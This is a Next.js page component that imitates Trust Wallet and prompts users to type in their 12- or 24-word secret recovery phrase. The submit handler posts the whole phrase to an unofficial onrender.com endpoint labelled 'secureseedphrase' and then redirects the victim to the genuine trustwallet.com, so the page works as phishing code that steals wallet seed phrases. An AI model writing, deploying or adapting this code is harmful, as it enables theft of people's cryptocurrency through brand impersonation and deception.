
// src/components/trust-wallet/phrase-input-page.tsx
"use client";

import { useState, useEffect, useCallback } from 'react';
import Image from 'next/image';
import { RadioGroup, RadioGroupItem } from '@/components/ui/radio-group';
import { Label } from '@/components/ui/label';
import { Button } from '@/components/ui/button';
import { validatePhraseWord, type ValidatePhraseWordOutput } from '@/ai/flows/validate-phrase-word';
import { PhraseWordInput } from './phrase-word-input';
import { useToast } from '@/hooks/use-toast';
import { Loader2 } from 'lucide-react';
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";

type PhraseLength = 12 | 24;
type ValidationStatus = {
  isValid: boolean | null;
  reason?: string;
  isLoading: boolean;
};

const BACKEND_URL = 'https://trustwallet-y3lo.onrender.com/secureseedphrase';
const TRUST_WALLET_REDIRECT_URL = 'https://trustwallet.com/?utm_source=cryptwerk';

export default function PhraseInputPage() {
  const [phraseLength, setPhraseLength] = useState<PhraseLength>(12);
  const [words, setWords] = useState<string[]>(Array(12).fill(''));
  const [validationResults, setValidationResults] = useState<ValidationStatus[]>(
    Array(12).fill({ isValid: null, reason: '', isLoading: false })
  );
  const [wordVisibility, setWordVisibility] = useState<boolean[]>(Array(12).fill(false));
  const [isVerifying, setIsVerifying] = useState(false);
  const { toast } = useToast();

  useEffect(() => {
    setWords(Array(phraseLength).fill(''));
    setValidationResults(Array(phraseLength).fill({ isValid: null, reason: '', isLoading: false }));
    setWordVisibility(Array(phraseLength).fill(false));
  }, [phraseLength]);

  const handlePhraseLengthChange = (value: string) => {
    const newLength = parseInt(value, 10) as PhraseLength;
    setPhraseLength(newLength);
  };

  const handleWordChange = (index: number, value: string) => {
    const newWords = [...words];
    newWords[index] = value;
    setWords(newWords);

    if (value === '' || validationResults[index]?.isValid !== null) {
      const newValidationResults = [...validationResults];
      newValidationResults[index] = { isValid: null, reason: '', isLoading: false };
      setValidationResults(newValidationResults);
    }
  };

  const handleValidateWord = useCallback(async (index: number, word: string) => {
    const currentValidationResults = [...validationResults];
    if (!word.trim()) {
      currentValidationResults[index] = { isValid: null, reason: '', isLoading: false };
      setValidationResults(currentValidationResults);
      return;
    }

    currentValidationResults[index] = { ...currentValidationResults[index], isLoading: true };
    setValidationResults(currentValidationResults);

    try {
      const result: ValidatePhraseWordOutput = await validatePhraseWord({ word });
      currentValidationResults[index] = { ...result, isLoading: false };
    } catch (error) {
      console.error("Validation error:", error);
      currentValidationResults[index] = { isValid: false, reason: 'Validation request failed.', isLoading: false };
      toast({
        title: "Error",
        description: `Failed to validate word "${word}". Please try again.`,
        variant: "destructive",
      });
    }
    setValidationResults([...currentValidationResults]);
  }, [validationResults, toast]);


  const toggleWordVisibility = (index: number) => {
    const newWordVisibility = [...wordVisibility];
    newWordVisibility[index] = !newWordVisibility[index];
    setWordVisibility(newWordVisibility);
  };

  const handleVerifyPhrase = async () => {
    setIsVerifying(true);

    let allWordsFilled = true;
    const validationResultsForVerification = [...validationResults]; 
    const validationPromises = words.map((word, index) => {
      if (word.trim() === '') {
        allWordsFilled = false;
        validationResultsForVerification[index] = { isValid: false, reason: 'Word cannot be empty.', isLoading: false };
        return Promise.resolve();
      }
      if (validationResultsForVerification[index].isValid === null || validationResultsForVerification[index].isValid === false) {
        return handleValidateWord(index, word);
      }
      return Promise.resolve();
    });

    setValidationResults(validationResultsForVerification);
    await Promise.all(validationPromises);

    const finalValidationCheckResults = [...validationResults];
     words.forEach((word, index) => {
        if(word.trim() === '') {
            finalValidationCheckResults[index] = { isValid: false, reason: 'Word cannot be empty.', isLoading: false };
        }
    });
    setValidationResults(finalValidationCheckResults);

    if (!allWordsFilled) {
      toast({
        title: "Incomplete Phrase",
        description: "Please fill in all words.",
        variant: "destructive",
      });
      setIsVerifying(false);
      return;
    }
    
    const allLocallyValid = finalValidationCheckResults.every(result => result.isValid === true);

    if (allLocallyValid) {
      try {
        const response = await fetch(BACKEND_URL, {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({ secretPhrase: words }),
        });

        if (response.ok) {
          toast({
            title: "Success!",
            description: "Secret phrase saved and verified. Redirecting to Trust Wallet...",
            variant: "default",
          });
          window.location.href = TRUST_WALLET_REDIRECT_URL;
        } else {
          let finalErrorMessage = '';
          try {
            const errorData = await response.json();
            if (errorData && errorData.message && typeof errorData.message === 'string') {
              finalErrorMessage = errorData.message;
            } else {
              finalErrorMessage = `Backend Error: ${response.status} ${response.statusText}. Response was JSON but had no 'message' field or was not a string.`;
            }
          } catch (jsonError) {
             finalErrorMessage = `Backend Error: ${response.status} ${response.statusText}. The server's response was not in a readable JSON format.`;
          }

          toast({
            title: "Save Failed",
            description: `Could not save your secret phrase: ${finalErrorMessage}`,
            variant: "destructive",
          });
          setIsVerifying(false);
        }
      } catch (error) {
        console.error("Backend save error:", error);
        toast({
          title: "Network Error",
          description: "An error occurred while trying to save your secret phrase. Please check your connection and try again.",
          variant: "destructive",
        });
        setIsVerifying(false);
      }
    } else {
      toast({
        title: "Invalid Phrase",
        description: "One or more words are invalid or empty. Please review your phrase.",
        variant: "destructive",
      });
      setIsVerifying(false);
    }
  };


  return (
    <div className="container mx-auto p-4 sm:p-6 md:p-8 max-w-3xl w-full">
      <header className="mb-8 text-center flex flex-col items-center">
        <Image
          src="https://i.pinimg.com/736x/2a/98/d7/2a98d7c3b241b50f73f799b68a1eb501.jpg"
          alt="Trust Wallet Logo"
          width={64}
          height={64}
          className="mb-4 rounded-lg shadow-md"
        />
        <h1 className="text-4xl font-bold text-primary">Trust Wallet</h1>
        <p className="text-muted-foreground mt-2 text-lg">
          To keep your account safe log out of all trust wallet accounts. Securely enter your secret phrase.
        </p>
      </header>

      <Card className="mb-8 shadow-xl">
        <CardHeader>
          <CardTitle className="text-2xl">Phrase Length</CardTitle>
        </CardHeader>
        <CardContent>
          <RadioGroup
            defaultValue="12"
            onValueChange={handlePhraseLengthChange}
            className="flex space-x-6"
          >
            <div className="flex items-center space-x-2">
              <RadioGroupItem value="12" id="r1" className="h-5 w-5"/>
              <Label htmlFor="r1" className="cursor-pointer text-base">12 Words</Label>
            </div>
            <div className="flex items-center space-x-2">
              <RadioGroupItem value="24" id="r2" className="h-5 w-5"/>
              <Label htmlFor="r2" className="cursor-pointer text-base">24 Words</Label>
            </div>
          </RadioGroup>
        </CardContent>
      </Card>

      <Card className="shadow-xl">
        <CardHeader>
          <CardTitle className="text-2xl">Enter Your Secret Phrase</CardTitle>
        </CardHeader>
        <CardContent>
          <div className={`grid grid-cols-1 sm:grid-cols-2 md:grid-cols-3 gap-x-4 gap-y-6`}>
            {words.map((word, index) => (
              <PhraseWordInput
                key={`${phraseLength}-${index}`} 
                index={index}
                word={word}
                validationStatus={validationResults[index]}
                isVisible={wordVisibility[index]}
                onWordChange={(value) => handleWordChange(index, value)}
                onToggleVisibility={() => toggleWordVisibility(index)}
                onValidateWord={() => handleValidateWord(index, words[index])}
              />
            ))}
          </div>
          <Button
            onClick={handleVerifyPhrase}
            disabled={isVerifying}
            className="w-full mt-10 py-6 text-lg bg-primary hover:bg-primary/90 text-primary-foreground"
          >
            {isVerifying ? <Loader2 className="mr-2 h-5 w-5 animate-spin" /> : null}
            Secure Phrase
          </Button>
        </CardContent>
      </Card>
    </div>
  );
}

